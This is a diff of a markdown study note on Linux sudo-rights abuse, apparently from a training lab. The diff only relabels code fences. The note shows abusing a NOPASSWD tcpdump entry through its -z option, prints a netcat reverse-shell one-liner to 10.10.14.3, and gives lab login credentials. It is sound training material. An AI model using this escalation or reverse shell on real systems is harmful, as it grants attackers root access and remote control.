@@ -1,7 +1,7 @@
 # Sudo Rights Abuse
 Sudo privileges can be granted to an account, permitting the account to run certain commands in the context of the root (or another account) without having to change users or grant excessive privileges. When the `sudo` command is issued, the system will check if the user issuing the command has the appropriate rights, as configured in `/etc/sudoers`. When landing on a system, we should always check to see if the current user has any sudo privileges by typing `sudo -l`. Sometimes we will need to know the user's password to list their sudo rights, but any rights entries with the `NOPASSWD` option can be seen without entering a password.
 
-```sh
+```shellsession
 $ sudo -l
 
 Matching Defaults entries for sysadm on NIX02:
@@ -13,7 +13,7 @@ User sysadm may run the following commands on NIX02:
 
 If the sudoers file is edited to grant a user the right to run a command such as `tcpdump` per the following entry in the sudoers file: `(ALL) NOPASSWD: /usr/sbin/tcpdump` an attacker could leverage this to take advantage of a the postrotate-command option.
 
-```sh
+```shellsession
 $ man tcpdump
 
 <SNIP> 
@@ -24,7 +24,7 @@ Used in conjunction with the -C or -G options, this will make `tcpdump` run " po
 
 By specifying the `-z` flag, an attacker could use tcpdump to execute a shell script, gain a reverse shell as the root user or run other privileged commands. For example, an attacker could create the shell script `.test` containing a reverse shell and execute it as follows:
 
-```sh
+```shellsession
 $ cat /tmp/.test
 
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f
@@ -45,7 +45,7 @@ NIX02
 SSH to 10.129.2.210 (ACADEMY-LPE-NIX02), with user `htb-student` and password `Academy_LLPE!`
 1. What command can the htb-student user run as root? **Answer:**
    - Check with `sudo -l`:
-        ```sh
+        ```shellsession
         $ sudo -l
         Matching Defaults entries for htb-student on NIX02:
             env_reset, mail_badpass,
